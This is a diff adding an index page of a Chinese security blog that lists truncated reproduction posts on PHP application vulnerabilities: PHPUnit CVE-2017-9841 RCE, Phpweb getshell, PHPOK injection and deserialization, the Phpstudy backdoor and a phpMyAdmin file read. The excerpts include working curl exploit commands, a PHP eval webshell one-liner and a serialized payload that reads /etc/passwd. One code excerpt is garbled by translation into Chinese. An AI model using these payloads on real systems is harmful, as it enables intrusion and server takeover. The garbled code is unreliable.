@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/49/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-PhpYun/Phpyun v3.1 xml 注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PhpYun/Phpyun%20v3.1%20xml%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.401Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpyun-v3-1-xml-注入漏洞"><a href="#Phpyun-v3-1-xml-注入漏洞" class="headerlink" title="Phpyun v3.1 xml 注入漏洞"></a>Phpyun v3.1 xml 注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>函数过滤不严谨，用户POST过去的内容没有进行任何过滤，导致攻击者可以利用XML实体进行注入，从而获取数据库敏感信息</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>3.1 build14061</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本次漏洞文件位于 <code>weixin/model/index.class.php</code> ，代码如下：</p>
+<p>private function responseMsg() { $postStr =<br>$GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;];</p>
+<pre><code>if (!empty($postStr))&#123;
+
+             $postObj = simplexml_load_string($postStr, &#39;SimpleXMLElement&#39;, LIBXML_NOCDATA);
+              $fromUsername = $postObj-&gt;FromUserName;
+              $toUsername = $postObj-&gt;ToUserName;
+              $keyword = trim($postObj-&gt;Content);
+              $time = time();
+              $textTpl = &quot;&lt;xml&gt;
+     &lt;![CDATA[%s]]&gt;
+     &lt;![CDATA[%s]]&gt;
+     %s
+     &lt;![CDATA[%s]]&gt;
+     &lt;![CDATA[%s]]&gt;
+     0
+     &lt;/xml&gt;&quot;;
+  if(!empty( $keyword ))
+              &#123;
+              $msgType = &quot;text&quot;;
+               $contentStr = &quot;Welcome to wechat world!&quot;;
+               $resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);
+               echo $resultStr;
+              &#125;else&#123;
+               echo &quot;Input something...&quot;;
+              &#125;
+
+      &#125;else &#123;
+       echo &quot;&quot;;
+       exit;
+      &#125;
+  &#125;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/PhpYun/Phpyun%20v3.1%20xml%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PhpYun/Phpyun%20v3.1%20xml%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qupx00euy8v154ws6bz5" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpweb/Phpweb 前台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpweb/Phpweb%20%E5%89%8D%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.373Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpweb-前台getshell"><a href="#Phpweb-前台getshell" class="headerlink" title="Phpweb 前台getshell"></a>Phpweb 前台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>漏洞影响文件:/base/post.php /base/appfile.php /base/appplue.php<br>/base/appborder.php</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpweb&lt;=2.0.35</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1-首先要获取加密前的Md5值，用于文件较检-通过Post提交数据来获取"><a href="#1-首先要获取加密前的Md5值，用于文件较检-通过Post提交数据来获取" class="headerlink" title="1.首先要获取加密前的Md5值，用于文件较检,通过Post提交数据来获取!"></a>1.首先要获取加密前的Md5值，用于文件较检,通过Post提交数据来获取!</h3><pre><code>curl &quot;http://website/base/post.php&quot; -H &quot;act=appcode&quot;
+</code></pre>
+<p><img src="/resource/Phpweb%E5%89%8D%E5%8F%B0getshell/media/rId25.png"></p>
+<pre><code>ac34c64cdb405eff881efc5476a64761 ##这个就是初始值
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpweb/Phpweb%20%E5%89%8D%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpweb/Phpweb%20%E5%89%8D%E5%8F%B0getshell/" data-id="cl5c2quh100epy8v11fpggyvp" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-PHPUnit/（CVE-2017-9841）PHPunit 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PHPUnit/%EF%BC%88CVE-2017-9841%EF%BC%89PHPunit%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.346Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-9841）PHPunit-远程代码执行漏洞"><a href="#（CVE-2017-9841）PHPunit-远程代码执行漏洞" class="headerlink" title="（CVE-2017-9841）PHPunit 远程代码执行漏洞"></a>（CVE-2017-9841）PHPunit 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>TYPO3是瑞士TYPO3协会维护的一套免费开源的内容管理系统。PHPUnit是其中的一个基于PHP的测试框架。PHPUnit4.8.28之前的版本和5.6.3之前的5.x版本中的Util/PHP/eval-stdin.php文件存在安全漏洞。远程攻击者可通过发送以’</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PHPUnit 4.8.19-4.8.27PHPUnit 5.0.10-5.6.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>$ curl --data &quot;&lt;?php echo(pi());&quot; http://www.0-sec.org:8888/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+</code></pre>
+<p>总体来说就是向<strong>vendor/phpunit/src/Util/PHP/eval-stdin.php</strong>发送POST请求执行php代码。<img src="/resource/(CVE-2017-9841)PHPunit%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"><img src="/resource/(CVE-2017-9841)PHPunit%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png">也可以直接写入一句话**&lt;?=file_put_contents(&quot;1.php&quot;,<br>&#39;&lt;?=eval($_REQUEST[1]);?&gt;&#39;);**<img src="/resource/(CVE-2017-9841)PHPunit%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="3.png"><img src="/resource/(CVE-2017-9841)PHPunit%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="4.png"></p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
+<p>因为直接是RCE，如果当前目录可写，直接POST这样的body:</p>
+</blockquote>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/PHPUnit/%EF%BC%88CVE-2017-9841%EF%BC%89PHPunit%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PHPUnit/%EF%BC%88CVE-2017-9841%EF%BC%89PHPunit%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quh200eqy8v12424bs1u" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpstudy/Phpstudy 后门（非官方后门！！！）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpstudy/Phpstudy%20%E5%90%8E%E9%97%A8%EF%BC%88%E9%9D%9E%E5%AE%98%E6%96%B9%E5%90%8E%E9%97%A8%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%89/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.306Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpstudy-后门（非官方后门！！！）"><a href="#Phpstudy-后门（非官方后门！！！）" class="headerlink" title="Phpstudy 后门（非官方后门！！！）"></a>Phpstudy 后门（非官方后门！！！）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpstudy 2016</p>
+<pre><code>php\php-5.2.17\ext\php_xmlrpc.dll
+php\php-5.4.45\ext\php_xmlrpc.dll
+</code></pre>
+<p>Phpstudy 2018 的php-5.2.17、php-5.4.45</p>
+<pre><code>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll
+PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll
+</code></pre>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><ul>
+<li>  1、定位特征字符串位置</li>
+<li>  2、静态分析传参数据</li>
+<li>  3、动态调试构造传参内容</li>
+</ul>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpstudy/Phpstudy%20%E5%90%8E%E9%97%A8%EF%BC%88%E9%9D%9E%E5%AE%98%E6%96%B9%E5%90%8E%E9%97%A8%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%89/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpstudy/Phpstudy%20%E5%90%8E%E9%97%A8%EF%BC%88%E9%9D%9E%E5%AE%98%E6%96%B9%E5%90%8E%E9%97%A8%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%89/" data-id="cl5c2quh100eoy8v1fatvdvey" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpstudy/Phpstudy nginx 解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpstudy/Phpstudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.303Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpstudy-nginx-解析漏洞"><a href="#Phpstudy-nginx-解析漏洞" class="headerlink" title="Phpstudy nginx 解析漏洞"></a>Phpstudy nginx 解析漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>phpStudy 存在 nginx<br>解析漏洞，攻击者能够利用上传功能，将包含恶意代码的合法文件类型上传至服务器，从而造成任意代码执行的影响。</p>
+<p>该漏洞仅存在于phpStudy Windows版，Linux版不受影响。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>phpstudy: &lt;=8.1.0.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/Phpstudynginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/media/rId24.jpg" alt="1.jpeg"></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpstudy/Phpstudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpstudy/Phpstudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quh000eny8v17kt7a7y3" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-PHPOK/PHPOK 5.5 csrf+反序列化漏洞getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PHPOK/PHPOK%205.5%20csrf+%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.228Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PHPOK-5-5-csrf-反序列化漏洞getshell"><a href="#PHPOK-5-5-csrf-反序列化漏洞getshell" class="headerlink" title="PHPOK 5.5 csrf+反序列化漏洞getshell"></a>PHPOK 5.5 csrf+反序列化漏洞getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h1 id="PHPOK-5-5"><a href="#PHPOK-5-5" class="headerlink" title="PHPOK 5.5"></a>PHPOK 5.5</h1><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="可利用恶意类"><a href="#可利用恶意类" class="headerlink" title="可利用恶意类"></a>可利用恶意类</h4><p>恶意类文件：<code>framework\engine\cache.php</code></p>
+<p><strong>关键代码：</strong></p>
+<pre><code>&lt;?php
+class cache&#123;
+    public function save($id,$content=&#39;&#39;)&#123;
+        if(!$id || $content === &#39;&#39; || !$this-&gt;status)&#123;
+            return false;
+        &#125;
+        $this-&gt;_time();
+        $content = serialize($content);
+        $file = $this-&gt;folder.$id.&quot;.php&quot;;
+        file_put_contents($file,&#39;&lt;?php exit();?&gt;&#39;.$content);
+        $this-&gt;_time();
+        $this-&gt;_count();
+        if($GLOBALS[&#39;app&#39;]-&gt;db)&#123;
+            $this-&gt;key_list($id,$GLOBALS[&#39;app&#39;]-&gt;db-&gt;cache_index($id));
+        &#125;
+        return true;
+    &#125;
+    public function __destruct()&#123;
+        $this-&gt;save($this-&gt;key_id,$this-&gt;key_list);
+        $this-&gt;expired();
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>很明显的<code>__destruct</code>方法调用了<code>save</code>方法，且传递的两个参数皆可控。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/PHPOK/PHPOK%205.5%20csrf+%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PHPOK/PHPOK%205.5%20csrf+%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/" data-id="cl5c2quik00ety8v1hibmdjpe" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-PHPOK/PHPOK 5.3 前台注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.226Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PHPOK-5-3-前台注入"><a href="#PHPOK-5-3-前台注入" class="headerlink" title="PHPOK 5.3 前台注入"></a>PHPOK 5.3 前台注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PHPOK 5.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>灵活获取参数：$this-&gt;get()方法</p>
+<p>framework / init.php＃get</p>
+<pre><code>最后的公共函数get（$ id，$ type =“ safe”，$ ext =“”）
+&#123; 
+    // PGC进入获取
+    $ val = isset（$ _ POST [$ id]）？$ _POST [$ id]：（isset（$ _ GET [$ id]）？$ _GET [$ id]：（isset（$ _ COOKIE [$ id]）？$ _COOKIE [$ id]：&#39;&#39;））; 
+    if（$ val ==&#39;&#39;）&#123; 
+        if（$ type ==&#39;int&#39;|| $ type ==&#39;intval&#39;|| $ type ==&#39;float&#39;|| $ type ==&#39;floatval&#39;）&#123; 
+            返回0 ; 
+        &#125; else &#123; 
+            return”; 
+        &#125; 
+    &#125; 
+    //判断内容是否有转义，所有未转义的数据都直接转义
+    $ addslashes = false; 
+    if（function_exists（“ get_magic_quotes_gpc”）&amp;&amp; get_magic_quotes_gpc（））&#123; 
+        $ addslashes = true; 
+    &#125; 
+    if（！
+        $ addslashes）&#123; $ val = $ this-&gt; _ addslashes（$ val）; 
+    &#125;
+    返回$ this-&gt; format（$ val，$ type，$ ext）; 
+&#125;
+</code></pre>
+<p>跟进format函数：framework / init.php＃format</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" data-id="cl5c2quij00esy8v1agpu1e8o" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-PHPOK/PHPOK 5.3 前台无限制注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.223Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PHPOK-5-3-前台无限制注入"><a href="#PHPOK-5-3-前台无限制注入" class="headerlink" title="PHPOK 5.3 前台无限制注入"></a>PHPOK 5.3 前台无限制注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PHPOK 5.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>注入点：framework/model/list.php#arc_all</p>
+<pre><code>public function arc_all($project,$condition=&#39;&#39;,$field=&#39;*&#39;,$offset=0,$psize=0,$orderby=&#39;&#39;)
+    &#123;
+        if($this-&gt;_total &gt; 100000 &amp;&amp; $offset &gt; 10000)&#123;
+            return $this-&gt;_arc_all($project,$condition,$field,$offset,$psize,$orderby);
+        &#125;
+        $sql  = &quot; SELECT &quot;.$field.&quot; FROM &quot;.$this-&gt;db-&gt;prefix.&quot;list l &quot;;
+        $sql .= &quot; JOIN &quot;.$this-&gt;db-&gt;prefix.&quot;list_&quot;.$project[&#39;module&#39;].&quot; ext &quot;;
+        $sql .= &quot; ON(l.id=ext.id AND l.site_id=ext.site_id AND l.project_id=ext.project_id) &quot;;
+        if($project[&#39;is_biz&#39;])&#123;
+            $sql .= &quot; LEFT JOIN &quot;.$this-&gt;db-&gt;prefix.&quot;list_biz b ON(b.id=l.id) &quot;;
+        &#125;
+        if($project[&#39;cate&#39;] &amp;&amp; $project[&#39;cate_multiple&#39;])&#123;
+            $sql.= &quot; LEFT JOIN &quot;.$this-&gt;db-&gt;prefix.&quot;list_cate lc ON(l.id=lc.id) &quot;;
+        &#125;
+        if($condition)&#123;
+            $sql .= &quot; WHERE &quot;.$condition.&quot; &quot;;
+        &#125;
+        // 拼接$orderby参数
+        if($orderby)&#123;
+            $sql .= &quot; ORDER BY &quot;.$orderby.&quot; &quot;;
+        &#125;
+        if($psize)&#123;
+            $sql .= &quot; LIMIT &quot;.intval($offset).&quot;,&quot;.$psize;
+        &#125;
+        //注入
+        $rslist = $this-&gt;db-&gt;get_all($sql,&#39;id&#39;);
+        if(!$rslist)&#123;
+            return false;
+        &#125;
+        return $this-&gt;_arc_list_format($rslist,$project);
+    &#125;
+回溯寻找调用链：framework/phpok_call.php#_arclist
+
+private function _arclist($rs,$cache_id=&#39;&#39;)
+&#123;
+    // 264行
+    $orderby = $rs[&#39;orderby&#39;] ? $rs[&#39;orderby&#39;] : $project[&#39;orderby&#39;];
+
+    // 270行 调用arc_all函数，将$orderby传入
+    $rslist = $this-&gt;model(&#39;list&#39;)-&gt;arc_all($project,$condition,$field,$offset,$psize,$orderby);
+</code></pre>
+<p>回溯：framework/api/project_control.php#load_module</p>
+<pre><code>private function load_module($rs,$parent_rs=&#39;&#39;)
+&#123;
+    // 91行
+    $keywords = $this-&gt;get(&quot;keywords&quot;);
+    $ext = $this-&gt;get(&quot;ext&quot;);
+    $tag = $this-&gt;get(&quot;tag&quot;);
+    $uid = $this-&gt;get(&#39;uid&#39;,&#39;int&#39;);
+    $attr = $this-&gt;get(&#39;attr&#39;);
+    //价格，支持价格区间
+    $price = $this-&gt;get(&#39;price&#39;,&#39;float&#39;);
+    $sort = $this-&gt;get(&#39;sort&#39;);
+
+    //186行
+    if($sort)&#123;
+        $dt[&#39;orderby&#39;] = $sort;  // 可控
+        $pageurl .= &#39;&amp;sort=&#39;.rawurlencode($sort);
+        $this-&gt;rlist[&#39;sort&#39;] = $sort;
+    &#125;
+    // 208行，通过phpok函数动态调用_arclist()函数
+        $info = $this-&gt;call-&gt;phpok(&#39;_arclist&#39;,$dt);
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/" data-id="cl5c2quih00ery8v1fhqq6us7" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/%EF%BC%88WooYun-2016-1994%EF%BC%89Phpmyadmin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.062Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（WooYun-2016-1994）Phpmyadmin-任意文件读取漏洞"><a href="#（WooYun-2016-1994）Phpmyadmin-任意文件读取漏洞" class="headerlink" title="（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞"></a>（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>phpMyAdmin2.x 版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>POST /scripts/setup.php HTTP/1.1 
+Host: www.0-sec.org:8080
+Accept-Encoding: gzip, deflate Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded Content-Length: 80
+action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;
+</code></pre>
+
+        
+          <p class="article-more-link">
